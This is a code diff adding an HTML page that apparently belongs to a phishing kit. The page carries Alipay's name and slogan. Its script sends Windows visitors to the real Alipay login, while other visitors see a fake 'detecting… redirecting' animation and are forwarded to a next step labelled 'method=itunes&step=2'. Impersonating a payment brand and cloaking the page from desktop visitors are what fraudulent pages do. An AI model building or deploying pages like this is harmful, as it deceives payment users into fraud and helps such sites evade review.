@@ -1,0 +1,36 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="icon" href="/favicon2.ico">
+    <title>手机支付宝-支付宝 知托付！</title>
+    <script src="./jquery.js"></script>
+    <script>
+    //https://auth.alipay.com/login/index.htm
+        if(/window/.test(navigator.userAgent.toLocaleLowerCase())){
+            window.location.href = "https://auth.alipay.com/login/index.htm";
+        }
+    </script>
+</head>
+<body>
+    <p1 id="p1">检测中...</p1>
+    <script>
+        let p = $("#p1");
+        let i = 0;
+        let a = ['检测中.','检测中..','检测中...'];
+        let t1 = setInterval(()=>{
+            p.html(a[i%a.length]);
+            i++;
+        },300);
+
+        setTimeout(()=>{
+            clearInterval(t1);
+            p.html("跳转中...");
+            setTimeout(()=>{
+            window.location.href = "./?method=itunes&step=2";
+            }, 400)
+        }, 1500);
+    </script>
+</body>
+</html>
